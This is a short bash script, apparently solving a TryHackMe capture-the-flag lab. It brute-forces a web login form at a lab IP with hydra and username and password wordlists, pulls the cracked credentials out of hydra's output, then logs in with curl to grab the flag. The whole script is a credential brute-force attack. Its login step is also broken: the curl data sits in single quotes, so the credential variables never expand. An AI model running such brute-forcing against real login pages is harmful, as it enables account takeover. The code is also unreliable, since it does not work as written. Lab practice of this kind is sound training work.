output=$(hydra -L usernames.txt -P passwords.txt 10.10.88.75 http-post-form "/login:username=^USER^&password=^PASS^:incorrect");

username=$(echo $output | cut -d':' -f 12 | cut -d' ' -f 2);
password=$(echo $output | cut -d':' -f 13 | cut -d' ' -f 2);

echo "The username is: $username";
echo "The password is: $password";

flag=$(curl -s -L --data-raw 'username=$username&password=$password' http://10.10.88.75/login | grep "THM{" | cut -d "{" -f2 | cut -d "}" -f1);

echo "THM{$flag}";
